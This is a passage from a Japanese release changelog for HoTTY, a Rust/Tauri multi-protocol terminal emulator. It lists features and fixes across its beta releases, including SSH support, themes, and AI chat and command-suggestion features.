- **フォント列挙の unsafe 強化** — Windows フォント列挙コールバックで、OS 供給ポインタを参照する前に null / アラインメントを検証

### メンテナンス

- **未使用アセットの削除** — アプリ内で参照されていない `public/HoTTY_logo.png` を削除
- **テスト追加** — 未保存エディタトラッカーユーティリティのユニットテストを追加

## v2.0.0-beta3

テーマカスタマイズ、UI の調整、テストカバレッジ拡張に焦点を当てた3番目のベータリリースです。

### 新機能

- **カスタムテーマクリエイター** — 外観タブから任意の CSS 変数を編集してユーザー定義テーマを作成・保存・編集・削除できるアプリ内エディタ
- **ヘルプツールチップコンポーネント** — 設定項目やコントロールの横に表示される文脈ヘルプヒント
- **バージョン入りウィンドウタイトル** — メインウィンドウのタイトルに現在のアプリバージョンを表示

### 改善

- **設定モーダル** — 全タブ (外観・全般・機能・プロトコル・AI・バージョン情報) のスタイルを統一し視覚的整合性を向上
- **設定ストア** — 追加の機能トグルと設定オプションを拡張
- **サイドバーのアイコン間隔** — アプリサイドバーのアイコン配置を調整し均等化
- **非推奨の ConnectForm を削除** — セッションダイアログに完全置き換え、レガシーコンポーネントとスタイルを削除
- **テストカバレッジの拡張** — AI チャットパネル、Ask AI モーダル、認証パネル、テーマユーティリティ、カラー/HTML ヘルパー関数のテストを追加
- **ヘルプモーダル** — 新しいカスタムテーマクリエイターのワークフローに対応したドキュメントに更新

### バグ修正

- **モーダル CSS の整合性** — PasteConfirmationModal、SettingsModal、HelpModal のパディング、ボーダー半径、アニメーションタイミングを統一
- **ペインツールバーの整合性** — TextEditorPane と PingMonitorPane のツールバーを標準 36px ツールバー仕様に整合

## v2.0.0-beta2

AI統合、接続管理UI、ユーティリティペインの強化を含む2番目のベータリリースです。

### 新機能

- **AI チャットペイン** — マルチプロバイダー対応AIチャット (ストリーミングレスポンス、ペルソナ、トークンコスト追跡)
- **AI プロバイダー** — Google AI Studio (Gemini)、Vertex AI、Anthropic (Claude)、OpenAI (GPT) をプロバイダー別認証で対応
- **AI バックエンドサービス** — SSEストリーミング対応の Rust ベース AI プロバイダー基盤
- **Ask AI モーダル** — ターミナルテキストを右クリックして、組み込みまたはカスタムコマンドで AI に問い合わせ
- **AI 設定タブ** — AI プロバイダー、モデル、ペルソナ、Ask AI コマンド、コマンド実行モード、モニターバッファ制限の設定
- **AI インタラクティブモード** — AI がターミナルコマンドを提案・実行 (安全性分類: 安全/破壊的/不明)
- **AI ウォッチモード** — ターミナル出力を監視し、キャプチャしたログを AI に送信して分析
- **ホストツリー** — フォルダ、ドラッグ＆ドロップ並べ替え、ホストツリーのエクスポート/インポート対応の接続管理UI
- **セッションダイアログ** — SSH、Telnet、シリアル、WSL、ローカル、Git Bash セッションの作成・編集ダイアログ (ジャンプボックス・IAPトンネル対応)
- **ヘルプモーダル** — 全機能、ショートカット、AIセットアップガイドを網羅するアプリ内ドキュメント
- **確認モーダル** — 破壊的操作用の再利用可能な確認ダイアログ
- **コマンド分類器** — AI自動実行判定のためターミナルコマンドを安全/破壊的/不明に分類
- **AI トークン価格** — 全対応プロバイダーのモデル別コスト見積もり用価格データ

### 改善

- **テキストエディタ** — 検索＆置換、行移動、サブタブによる複数ファイル対応、エンコーディング/改行コード選択、行折り返し、改行コード可視化、ファイル関連付けを追加した大幅強化
- **ファイルエクスプローラ** — パンくずパス、隠しファイル切替、ドライブ参照、ダブルクリックでエディタを開く機能による改善
- **Pingモニター** — 設定可能なインターバル、ログ出力、レイアウト改善による強化
- **ログビューア** — 検索/フィルター、正規表現切替、ファイル参照の改善
- **タブバー** — フィーチャーペインタブ対応とドラッグ＆ドロップの改善
- **設定ストア** — AI設定、有効フィーチャー、追加設定オプションの拡張
- **セッションマネージャー** — AIチャットターミナル統合のサポートを更新
- **アプリアイコン** — 全プラットフォーム (Windows, macOS, iOS, Android) のアイコンを刷新
- **新ユーティリティフック** — useFocusTrap、useModalState、useResize による UI インタラクションの改善
- **ANSI ユーティリティ** — ターミナル出力処理用の ANSI コード処理関数を追加
- **カラー・HTMLユーティリティ** — 色操作・HTML処理のヘルパー関数を追加

## v2.0.0-beta1

Rust/Tauri 版リライトの初回ベータリリースです。Electron ベースの HoTTY を Tauri v2 バックエンドに置き換え、メモリ効率とパフォーマンスを改善しました。

### 新機能

- **マルチプロトコル接続** — SSH、Telnet、シリアル、WSL、ローカルシェル (cmd, PowerShell, Git Bash)
- **SSH ホスト鍵検証** — 新規・変更されたホスト鍵のフィンガープリント表示と承認/拒否プロンプト
- **SSH 秘密鍵認証** — 鍵ファイルとパスフレーズ対応
- **SSH アルゴリズム設定** — KEX、暗号、MAC、ホスト鍵アルゴリズムの設定
- **シリアルポート対応** — ボーレート、データビット、パリティ、ストップビット、フロー制御の設定
- **WSL ディストリビューション選択** — インストール済みの任意の WSL ディストリビューションに接続
- **マルチペインレイアウト** — グリッドレイアウト (1x1, 1x2, 2x1, 2x2, 2x3, 3x2) と四辺の折りたたみサイドバー
- **タブバー** — ドラッグ＆ドロップによる並べ替え、セッション・フィーチャーペインタブ
- **ログビューアペイン** — セッションログファイルの閲覧・表示
- **テキストエディタペイン** — ファイルの表示・編集・保存 (改行コード検出対応)
- **ファイルエクスプローラペイン** — ディレクトリ・ドライブの参照、テキストエディタでファイルを開く
- **Pingモニターペイン** — 複数ターゲットの監視 (間隔設定・ログ出力対応)
- **テーマ機能** — 組み込み Dark / Medium / Light テーマとカスタムテーマ対応
- **設定モーダル** — 外観、全般、機能、プロトコル、バージョン情報のタブ構成
- **Windows DPAPI 暗号化** — 保存された接続の認証情報を安全に保管
- **貼り付け確認** — ターミナルへの貼り付け前にクリップボード内容を確認するモーダル
- **セッションログ** — セッションごとのログファイル出力
- **ホストツリー エクスポート/インポート** — 暗号化 .htree 形式による接続設定のバックアップ
- **GCE IAP トンネル** — Identity-Aware Proxy 経由で Google Cloud インスタンスに接続
- **エンコーディング対応** — セッションごとに UTF-8、Shift_JIS、EUC-JP を選択可能
- **キープアライブ** — SSH / Telnet 接続のキープアライブ間隔設定
- **システムフォント検出** — インストール済みフォントの一覧表示・選択
- **コンテキストメニュー** — 右クリックメニュー対応
- **デバッグログ管理** — デバッグログフォルダの表示・オープン

### 改善

- **Rust/Tauri v2 バックエンド** — Electron からの完全リライトによりメモリ使用量削減・起動高速化
- **Zustand 状態管理** — localStorage ミドルウェアによる設定の永続化
- **型付き IPC レイヤー** — 全 Tauri コマンドを tauriService.ts で TypeScript 型付きラッパーとして実装
- **包括的なテストカバレッジ** — 全フロントエンドコンポーネント・フック・サービスの Vitest テスト

## v0.1.1

スキャフォールドのみのバージョン更新。機能変更なし。

## v0.1.0

- Tauri v2 プロジェクトの初期スキャフォールドとマイグレーション仕様書。
